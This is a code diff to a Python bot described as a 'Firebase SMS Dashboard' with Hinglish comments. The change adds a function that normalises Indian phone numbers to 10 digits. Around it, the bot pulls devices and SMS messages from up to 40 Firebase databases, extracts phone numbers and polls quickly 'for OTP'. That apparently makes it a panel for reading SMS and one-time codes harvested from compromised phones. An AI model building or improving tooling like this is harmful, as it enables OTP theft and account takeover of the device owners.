@@ -3,7 +3,7 @@
 Firebase SMS Dashboard Bot — FREE Edition (No Refer / No Credits / Manual Refresh)
 - Multi-Firebase (40)
 - BULK Firebase add
-- FULL phone number display
+- FULL phone number display (sirf 10 digit, +91 auto-remove)
 - ✅ Force Join Channels (Admin controlled, default EMPTY)
 - ❌ No Referral, No Credits, No Captcha
 - ❌ No Auto-Refresh (sirf admin manual refresh)
@@ -292,6 +292,29 @@ _PHONE_PATTERNS = [
 
 
 # ============================================================
+# PHONE NORMALIZATION  ⭐ (+91 / 91 / 0 / 0091 auto-remove)
+# ============================================================
+def _normalize_phone_10(raw) -> str:
+    """Country code hatao, sirf 10-digit number return karo."""
+    if raw is None:
+        return ""
+    digits = re.sub(r"\D", "", str(raw))
+    if not digits:
+        return ""
+    # Strip leading 0091 / 91 / 0
+    if digits.startswith("0091") and len(digits) > 10:
+        digits = digits[4:]
+    elif digits.startswith("91") and len(digits) > 10:
+        digits = digits[2:]
+    elif digits.startswith("0") and len(digits) > 10:
+        digits = digits[1:]
+    # Safety: agar abhi bhi 10 se zyada, last 10 lo
+    if len(digits) > 10:
+        digits = digits[-10:]
+    return digits
+
+
+# ============================================================
 # FIREBASE HELPERS
 # ============================================================
 def normalize_fb_url(url: str) -> Optional[str]:
@@ -456,8 +479,7 @@ def _get_mob_no(info):
            or info.get("phoneNumber") or info.get("phone") or "")
     if not raw:
         return ""
-    digits = re.sub(r"\D", "", str(raw))
-    return digits
+    return _normalize_phone_10(raw)
 
 
 def _newest_messages(msgs, limit=FB_MESSAGES_LIMIT):
@@ -667,13 +689,13 @@ async def fetch_devices_from_one(fb_url: str, fb_tag: str,
                         try:
                             ext = phone_lookups.get(str(cid))
                             if ext:
-                                phone = ext
+                                phone = _normalize_phone_10(ext)
                         except Exception:
                             pass
                     if isinstance(m_data, dict) and m_data:
                         ext = extract_phone_from_messages(m_data)
                         if ext:
-                            phone = ext
+                            phone = _normalize_phone_10(ext)
                 if not phone:
                     continue
                 prefixed_id = f"{fb_tag}|{cid}"
@@ -2653,6 +2675,7 @@ def main():
     print(f"  Auto device refresh: ❌ DISABLED (sirf admin manual)")
     print(f"  SMS poll interval: {SMS_MONITOR_INTERVAL}s (⚡ fast OTP)")
     print(f"  First-cycle suppress: ✅ (purane SMS skip)")
+    print(f"  Phone format: ✅ 10-digit only (+91 auto-remove)")
     print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
     print("=" * 60)
 
